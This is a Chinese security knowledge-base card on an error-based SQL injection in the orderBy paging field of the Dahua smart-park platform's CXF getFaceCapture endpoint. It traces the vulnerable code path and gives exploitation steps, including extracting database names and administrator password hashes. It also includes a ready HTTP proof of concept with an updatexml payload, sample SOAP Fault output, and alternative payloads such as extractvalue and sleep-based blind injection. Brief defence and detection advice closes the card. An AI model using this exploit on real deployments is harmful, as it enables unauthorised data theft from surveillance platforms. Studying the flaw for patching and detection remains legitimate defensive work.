---
id: web-java-component-dahua-getfacecapture-orderby-sqli
title: 大华智慧园区 getFaceCapture 分页 orderBy 报错注入：CXF WebService 将排序字段直接拼入 order by
type: scenario
domain: web
path: web/java/component
technique: dahua-getfacecapture-orderby-sqli
aliases:
- getFaceCapture SQL注入
- 大华园区 orderBy 注入
- updatexml 报错注入
- CXFServlet carQuery
- FaceCaptureDaoImpl
tags:
- java
- dahua
- wpms
- sqli
- order-by
- cxf
- webservice
- error-based
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V383
  verified_at: '2026-11-09T08:54:00+08:00'
  notes: 已对照原文核对：CXF /services/* 映射、CarQueryServiceImpl→FaceCaptureManagerImpl→FaceCaptureDaoImpl→PaginationJdbcSupport.addOrderBy 的 orderBy 拼接链、最终 SQL 与 SOAP Fault 回显截图一致；未验证点：md5(114514) 完整值为 c4d038b4bed09fdb1471ef51ec3a32cd，截图中被 updatexml 截断为 ...32c，卡片按截图记录并已说明 32 字符回显限制。
---

## 一句话结论

大华智慧园区 portal 模块通过 CXF 暴露的 `/portal/services/carQuery/getFaceCapture/...` 接口把 URL 路径里的 `pageJson` 反序列化为分页对象，其中的 `orderBy` 在用户未显式传值时仅做“空则设默认值”的处理，随后被 `PaginationJdbcSupport.addOrderBy` 以 `" order by " + page.getOrderBy() + " " + page.getOrder()` 原样拼进 SQL；攻击者在 `orderBy` 中放入 `1 and 1=updatexml(1,concat(0x7e,(select md5(114514)),0x7e),1)--` 即可通过 MySQL 报错把任意子查询结果带回 SOAP Fault，形成有回显的报错注入。

## 原理

- **入口**：`portal/WEB-INF/web.xml` 把 `CXFServlet` 映射到 `/ws/*` 与 `/services/*`；`applicationContext.xml` 用 `<jaxws:endpoint>` 暴露 `CarQueryService`（地址 `/carQuery`）。请求路径 `/portal/services/carQuery/getFaceCapture/searchJson/{}/pageJson/{}/extend/{}` 的三个路径段分别作为 `searchJson`、`pageJson`、`extend` 参数。
- **参数解析**：`CarQueryServiceImpl.getFaceCapture(searchJson, pageJson, extend)` 用 `JsonUtils.fromJson(pageJson, Page<FaceCapture>)` 解析分页对象，随后 `defaultFaceCaptureSearchOrder(page)`：仅当 `page.getOrderBy()` 为空时设置 `detectTime`/`desc`，**不会过滤已有值**。
- **下沉链路**：`FaceCaptureManagerImpl.getFaceCaptureJson → getFaceCapturePage → FaceCaptureDaoImpl.getFaceCapturePage → super.findSql(page, FaceCapture.class, sql, new Object[0]) → AbstractDao.findSql → PaginationJdbcSupport.find → getResultMySql`。
- **拼接点**：
  ```java
  private void addOrderBy(StringBuffer paginationSQL, Page<?> page) {
      if (!StringUtils.isEmpty(page.getOrderBy())) {
          paginationSQL.append(" order by ").append(page.getOrderBy()).append(" ").append(page.getOrder());
      }
  }
  ```
  `getResultMySql` 还追加 `limit first,pageSize`；`orderBy` 来自客户端 JSON，参数值为 `Object[0]`，因此没有任何预编译参数能约束它。
- **为什么能回显**：MySQL 的 `updatexml()` 把 `0x7e`（`~`）与子查询结果拼成非法 XPath，报错信息中带出拼接后的字符串；CXF 把异常包装成 SOAP Fault（HTTP 200/500 的 XML），`faultstring` 里即可读到 `~<md5>~`。
- **最终 SQL 形态**：
  ```sql
  select t.CAPTUREINDEX as id,... from IVS_FACE_CAPTURE t where 1=1
  order by 1 and 1=updatexml(1,concat(0x7e,(select md5(114514)),0x7e),1)-- asc limit -1,-1
  ```
  `--` 后带空格注释掉尾部 `asc limit`，语法成立。

## 触发条件

- 目标为大华智慧园区平台，`/portal/services/*` 或 `/portal/ws/*` 的 CXF 端点可达。
- 数据库为 MySQL（走 `getResultMySql` 分支），且当前账号可执行 `updatexml`（MySQL 5.7 及以下通常可用）。
- `pageJson` 能被解析为 `Page`，`orderBy` 非空以覆盖默认 `detectTime`。
- CXF 异常未被网关统一吞掉，SOAP Fault 能返回给客户端（或至少错误内容可被观测）。

## 利用步骤

1. 确认接口：请求 `/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%7D/extend/%7B%7D`，观察是否返回 SOAP 响应。
2. 在 `pageJson` 中放入 `{"orderBy":"<注入片段>"}`，其余路径段保持 `{}`。
3. 先用 `md5(114514)` 验证：`1 and 1=updatexml(1,concat(0x7e,(select md5(114514)),0x7e),1)--`，在 SOAP Fault 中查找 `c4d038b4bed09fdb1471ef51ec3a32c`。
4. 替换子查询读取库名、表名、管理员口令哈希等；`updatexml` 单次回显长度有限（约 32 字符），超长结果用 `substr`/`mid` 分段。
5. 记录请求与响应证据后停止，不对业务数据做修改。

## PoC

```http
GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(114514)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Host: target
```

```xml
<!-- 响应中的 SOAP Fault（节选） -->
<faultstring>PreparedStatementCallback; uncategorized SQLException for SQL [select ... from IVS_FACE_CAPTURE t where 1=1 order by 1 and 1=updatexml(1,concat(0x7e,(select md5(114514)),0x7e),1)-- asc limit -1,-1]; SQL state [HY000]; error code [1105]; XPATH syntax error: '~c4d038b4bed09fdb1471ef51ec3a32c~'</faultstring>
```

`c4d038b4bed09fdb1471ef51ec3a32c` 即 `md5("114514")`，证明子查询结果被带入报错回显。

## 变体与关联

- 变体：`order` 字段同样被直接拼接（`append(" ").append(page.getOrder())`），可尝试其它注入位置或闭合方式。
- 变体：同类的 `getFaceRecognition` 等分页方法复用 `default*SearchOrder` 与 `PaginationJdbcSupport`，可能存在相同拼接；按接口逐一测试。
- 变体：若 `updatexml` 被禁用，改用 `extractvalue`、`geometrycollection`、`exp(~(select ...))` 等报错函数，或时间盲注 `sleep()`。
- 关联：[[web-java-component-dahua-wpms-mybatis-orderby-sqli]]（同平台 MyBatis `${sortBy}` 注入）、[[web-java-component-dahua-attachment-cleartempfile-recid-sqli]]（同平台字符串拼接注入）、[[web-generic-sqli-json-fieldconditions-value-updatexml-union]]（JSON 参数承载 order/field 条件的同类注入）。

## 检测与防御

- 防御：`orderBy`/`order` 使用枚举/白名单映射到固定列名与排序方向，绝不拼接原始字符串；对分页对象做字段级校验。
- 防御：数据库账号最小权限；关闭详细 SQL 异常回显，CXF 层统一异常处理，避免 SOAP Fault 泄露 SQL 与报错内容。
- 检测：`pageJson`/`orderBy` 中出现 `updatexml`、`extractvalue`、`sleep`、`concat(0x7e`、`--`、子查询等特征；SOAP Fault 中出现完整 SQL 语句或 `XPATH syntax error`；同一接口高频异常请求。
